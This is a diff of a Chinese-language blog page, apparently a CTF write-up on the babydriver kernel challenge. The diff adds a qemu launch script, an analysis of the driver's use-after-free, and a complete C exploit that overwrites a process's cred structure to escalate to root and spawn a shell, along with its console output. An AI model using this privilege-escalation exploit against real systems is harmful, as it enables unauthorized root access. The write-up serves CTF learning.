@@ -16,18 +16,18 @@
     <meta name="renderer" content="webkit">
     <meta name="copyright" content="John Doe">
     
-        <meta name="keywords" content="hexo,hexo-theme,hexo-blog,blog,pwn,heap">
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog,blog,pwn,heap,wp">
     
     <meta name="description" content="">
-    <meta name="description" content="题目分析init和exit没有什么特殊内容，就是正常的注册和析构。注册了一个名叫babydev的字符设备。 这道题在bss有一个全局变量，包含了一个buf指针和一个长度字段。下面看看这个驱动在干嘛： open12345678910int __fastcall babyopen(inode *inode, file *filp)&amp;#123;  __int64 v2; &#x2F;&#x2F; rdx  _fentry_">
+    <meta name="description" content="题目分析init和exit没有什么特殊内容，就是正常的注册和析构。注册了一个名叫babydev的字符设备。 这道题在bss有一个全局变量，包含了一个buf指针和一个长度字段。下面看看这个驱动在干嘛： init.sh-qemu参数：12345678910#!&#x2F;bin&#x2F;bashqemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Kernel Pwn从入门到入土-2">
 <meta property="og:url" content="http://example.com/2024/10/11/Kernel-Pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-2/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="题目分析init和exit没有什么特殊内容，就是正常的注册和析构。注册了一个名叫babydev的字符设备。 这道题在bss有一个全局变量，包含了一个buf指针和一个长度字段。下面看看这个驱动在干嘛： open12345678910int __fastcall babyopen(inode *inode, file *filp)&amp;#123;  __int64 v2; &#x2F;&#x2F; rdx  _fentry_">
+<meta property="og:description" content="题目分析init和exit没有什么特殊内容，就是正常的注册和析构。注册了一个名叫babydev的字符设备。 这道题在bss有一个全局变量，包含了一个buf指针和一个长度字段。下面看看这个驱动在干嘛： init.sh-qemu参数：12345678910#!&#x2F;bin&#x2F;bashqemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2024-10-11T08:28:17.000Z">
-<meta property="article:modified_time" content="2024-10-30T12:47:48.790Z">
+<meta property="article:modified_time" content="2024-11-20T07:46:49.673Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="pwn">
 <meta property="article:tag" content="kernel">
@@ -497,21 +497,32 @@
     <article class="article-entry">
         <h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p>init和exit没有什么特殊内容，就是正常的注册和析构。注册了一个名叫<code>babydev</code>的字符设备。</p>
 <p>这道题在bss有一个全局变量，包含了一个buf指针和一个长度字段。下面看看这个驱动在干嘛：</p>
+<h2 id="init-sh-qemu参数："><a href="#init-sh-qemu参数：" class="headerlink" title="init.sh-qemu参数："></a>init.sh-qemu参数：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">qemu-system-x86_64 -initrd rootfs.cpio </span><br><span class="line">-kernel bzImage </span><br><span class="line">-append <span class="string">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27;</span> </span><br><span class="line">-enable-kvm </span><br><span class="line">-monitor /dev/null </span><br><span class="line">-m 64M </span><br><span class="line">--nographic </span><br><span class="line">-smp cores=1,threads=1 </span><br><span class="line">-cpu kvm64,+smep <span class="comment"># 开启了smep</span></span><br></pre></td></tr></table></figure>
 <h2 id="open"><a href="#open" class="headerlink" title="open"></a>open</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyopen</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);<span class="comment">//</span></span><br><span class="line">  babydev_struct.device_buf = (<span class="type">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">0x24000C0</span>LL, <span class="number">64LL</span>);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">64LL</span>;</span><br><span class="line">  printk(<span class="string">&quot;device open\n&quot;</span>, <span class="number">0x24000C0</span>LL, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>fentry不用管，是编译的时候gcc在函数入口插入的东西。</p>
-<p>open这个驱动会将buf初始化, 调用<code>kmem_cache_alloc_trace</code>分配内存。这个函数也是抽象好几层后的了，我们后面再谈linux内核的内存分配。</p>
+<p>open这个驱动会将buf初始化, 调用<code>kmem_cache_alloc_trace</code>分配一个0x40的object。这个函数也是抽象好几层后的了，我们后面再谈linux内核的内存分配。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline __alloc_size(<span class="number">3</span>) <span class="type">void</span> *<span class="title function_">kmem_cache_alloc_trace</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">gfp_t</span> flags, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">void</span> *ret = kmem_cache_alloc(s, flags);</span><br><span class="line">	ret = kasan_kmalloc(s, ret, size, flags);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <h2 id="read和write"><a href="#read和write" class="headerlink" title="read和write"></a>read和write</h2><p>没什么差别，直接复制数据：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">babyread</span><span class="params">(file *filp, <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer, length);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_to_user(buffer);</span><br><span class="line">    <span class="keyword">return</span> v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">babywrite</span><span class="params">(file *filp, <span class="type">const</span> <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer, length);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_from_user();</span><br><span class="line">    <span class="keyword">return</span> v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h2><p>ioctl提供了一个调用kmalloc重新分配buf的接口</p>
+<h2 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h2><p>ioctl提供了一个调用kmalloc重新分配buf的接口，这里的v4是我们用户态可以控制的参数，也就是说可以重新分配size</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">babyioctl</span><span class="params">(file *filp, <span class="type">unsigned</span> <span class="type">int</span> command, <span class="type">unsigned</span> __int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, command, arg);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">0x10001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = (<span class="type">char</span> *)_kmalloc(v4, <span class="number">0x24000C0</span>LL);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(<span class="string">&quot;alloc done\n&quot;</span>, <span class="number">0x24000C0</span>LL, v5);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2EB, v3, v3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="release"><a href="#release" class="headerlink" title="release..?"></a>release..?</h2><p><em>目前还不知道怎么触发</em></p>
+<h2 id="release"><a href="#release" class="headerlink" title="release"></a>release</h2><p>对于正常的驱动，release函数会在文件关闭的时候触发。但是这个函数没有在data段开头的file_operations里注册，反而在<code>__mount_loc</code>节中查到了引用，不知道怎么触发的。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  kfree(babydev_struct.device_buf);</span><br><span class="line">  printk(<span class="string">&quot;device release\n&quot;</span>, filp, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>release有一个UAF，kfree但全局变量指针不置空。</p>
 <p>总体来看涉及kmalloc和kfree, 可能与内核的堆利用有关。所以下面先介绍一下内核的内存管理机制。</p>
 <blockquote>
 <p>篇幅考虑，相关内容单开了一篇blog，<a target="_blank" rel="noopener" href="https://zjw1nd.github.io/2024/10/30/%E9%A1%B5%E8%A1%A8%E4%B9%8B%E4%B8%8A%E2%80%94%E2%80%94Linux%E5%86%85%E6%A0%B8%E7%9A%84%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/">点此跳转</a></p>
 </blockquote>
+<h1 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h1><blockquote>
+<p>参考自 <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/259252#h2-2">在2021年再看ciscn2017 babydriver</a></p>
+</blockquote>
+<h2 id="1-简单粗暴——4-4-72版本uaf必定导致提权"><a href="#1-简单粗暴——4-4-72版本uaf必定导致提权" class="headerlink" title="1. 简单粗暴——4.4.72版本uaf必定导致提权"></a>1. 简单粗暴——4.4.72版本uaf必定导致提权</h2><p>如果了解了slab我们就能知道，在kfree后这个object会被放回其原本的list中（比如kmem_cpu_cache的slab列表），并且freelist的第一个也会指向它。也就是说我们能够保证，只要free进去后没有别的操作连续申请相同大小的对象，下一次一定会返回这一个。</p>
+<p>知道了这个我们就有很多的利用方法了。一种比较简单的方法就是把它改成cred的大小然后用户态fork起shell，通过UAF直接改掉euid。这个漏洞在kernel 4.4.72是可用的，显然是因为内核并没有相关的检查——至少这道题的内核没有</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/ $ <span class="built_in">whoami</span></span><br><span class="line">ctf</span><br><span class="line">/ $ ./ez_uaf</span><br><span class="line">[*] Start to exploit...</span><br><span class="line">[   11.928864] device open</span><br><span class="line">[   11.929808] device open</span><br><span class="line">[   11.931073] alloc <span class="keyword">done</span></span><br><span class="line">[   11.932012] device release</span><br><span class="line">[+] Successful to get the root. Execve root shell now...</span><br><span class="line">/ <span class="comment"># ls</span></span><br><span class="line">bin          dev          ez_uaf.c     lib          root         sys</span><br><span class="line">boot.sh      etc          home         linuxrc      rootfs.cpio  tmp</span><br><span class="line">bzImage      ez_uaf       init         proc         sbin         usr</span><br><span class="line">/ <span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0xa8</span>); <span class="comment">// cred大小</span></span><br><span class="line">    close(fd1);</span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Unable to fork the new thread, exploit failed.\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) <span class="comment">// the child thread</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        write(fd2, buf, <span class="number">28</span>); <span class="comment">// UAF </span></span><br><span class="line">        <span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">            system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Unable to get the root, exploit failed.\033[0m\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="comment">// the parent thread</span></span><br><span class="line">    &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);<span class="comment">//waiting for the child</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="2-更复杂的利用——4-5-版本"><a href="#2-更复杂的利用——4-5-版本" class="headerlink" title="2. 更复杂的利用——4.5+版本"></a>2. 更复杂的利用——4.5+版本</h2><p>在这个版本，为cred分配的slab 对象池<code>cred_jar</code>在初始化的时候添加了一个flag位<code>SLAB_ACCOUNT</code>，这导致这样的问题，内核驱动中手动调用的kmalloc虽然大小一样，但是和cred_jar不再共享一个对象池。</p>
+<p>这个时候要引出通用的一个解决方案：劫持tty_struct.</p>
 
     </article>
     <!-- license -->
@@ -667,7 +678,7 @@
                 <div class="toc-catalog">
                     <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                 </div>
-                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">题目分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#open"><span class="toc-number">1.1.</span> <span class="toc-text">open</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#read%E5%92%8Cwrite"><span class="toc-number">1.2.</span> <span class="toc-text">read和write</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ioctl"><span class="toc-number">1.3.</span> <span class="toc-text">ioctl</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#release"><span class="toc-number">1.4.</span> <span class="toc-text">release..?</span></a></li></ol></li></ol>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">题目分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#init-sh-qemu%E5%8F%82%E6%95%B0%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">init.sh-qemu参数：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#open"><span class="toc-number">1.2.</span> <span class="toc-text">open</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#read%E5%92%8Cwrite"><span class="toc-number">1.3.</span> <span class="toc-text">read和write</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ioctl"><span class="toc-number">1.4.</span> <span class="toc-text">ioctl</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#release"><span class="toc-number">1.5.</span> <span class="toc-text">release</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#UAF"><span class="toc-number">2.</span> <span class="toc-text">UAF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%AE%80%E5%8D%95%E7%B2%97%E6%9A%B4%E2%80%94%E2%80%944-4-72%E7%89%88%E6%9C%ACuaf%E5%BF%85%E5%AE%9A%E5%AF%BC%E8%87%B4%E6%8F%90%E6%9D%83"><span class="toc-number">2.1.</span> <span class="toc-text">1. 简单粗暴——4.4.72版本uaf必定导致提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%9B%B4%E5%A4%8D%E6%9D%82%E7%9A%84%E5%88%A9%E7%94%A8%E2%80%94%E2%80%944-5-%E7%89%88%E6%9C%AC"><span class="toc-number">2.2.</span> <span class="toc-text">2. 更复杂的利用——4.5+版本</span></a></li></ol></li></ol>
             </div>
         
         <!-- sidebar -->
@@ -947,10 +958,6 @@
         
         
     
-        
-        
-        
-        
         
         
         
@@ -1773,9 +1780,24 @@
                 算法
             </span>
         
+            <span class="sidebar-tag-name" data-tags="Android">
+                <span class="iconfont-archer">&#xe606;</span>
+                Android
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="逆向">
+                <span class="iconfont-archer">&#xe606;</span>
+                逆向
+            </span>
+        
             <span class="sidebar-tag-name" data-tags="pwn">
                 <span class="iconfont-archer">&#xe606;</span>
                 pwn
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="chop">
+                <span class="iconfont-archer">&#xe606;</span>
+                chop
             </span>
         
             <span class="sidebar-tag-name" data-tags="wp">
@@ -1798,16 +1820,6 @@
                 Lab
             </span>
         
-            <span class="sidebar-tag-name" data-tags="逆向">
-                <span class="iconfont-archer">&#xe606;</span>
-                逆向
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="Develop">
-                <span class="iconfont-archer">&#xe606;</span>
-                Develop
-            </span>
-        
             <span class="sidebar-tag-name" data-tags="Windows">
                 <span class="iconfont-archer">&#xe606;</span>
                 Windows
@@ -1818,14 +1830,14 @@
                 CVE
             </span>
         
+            <span class="sidebar-tag-name" data-tags="Develop">
+                <span class="iconfont-archer">&#xe606;</span>
+                Develop
+            </span>
+        
             <span class="sidebar-tag-name" data-tags="protobuf">
                 <span class="iconfont-archer">&#xe606;</span>
                 protobuf
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="FSOP">
-                <span class="iconfont-archer">&#xe606;</span>
-                FSOP
             </span>
         
             <span class="sidebar-tag-name" data-tags="kernel">
@@ -1833,14 +1845,19 @@
                 kernel
             </span>
         
-            <span class="sidebar-tag-name" data-tags="Rust">
+            <span class="sidebar-tag-name" data-tags="FSOP">
                 <span class="iconfont-archer">&#xe606;</span>
-                Rust
+                FSOP
             </span>
         
             <span class="sidebar-tag-name" data-tags="llvm">
                 <span class="iconfont-archer">&#xe606;</span>
                 llvm
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Rust">
+                <span class="iconfont-archer">&#xe606;</span>
+                Rust
             </span>
         
             <span class="sidebar-tag-name" data-tags="vm">
@@ -1863,11 +1880,6 @@
                 Others
             </span>
         
-            <span class="sidebar-tag-name" data-tags="ROP">
-                <span class="iconfont-archer">&#xe606;</span>
-                ROP
-            </span>
-        
             <span class="sidebar-tag-name" data-tags="IDA">
                 <span class="iconfont-archer">&#xe606;</span>
                 IDA
@@ -1878,6 +1890,11 @@
                 编译
             </span>
         
+            <span class="sidebar-tag-name" data-tags="ROP">
+                <span class="iconfont-archer">&#xe606;</span>
+                ROP
+            </span>
+        
             <span class="sidebar-tag-name" data-tags="web">
                 <span class="iconfont-archer">&#xe606;</span>
                 web
@@ -1886,11 +1903,6 @@
             <span class="sidebar-tag-name" data-tags="hvv">
                 <span class="iconfont-archer">&#xe606;</span>
                 hvv
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="chop">
-                <span class="iconfont-archer">&#xe606;</span>
-                chop
             </span>
         
     </div>
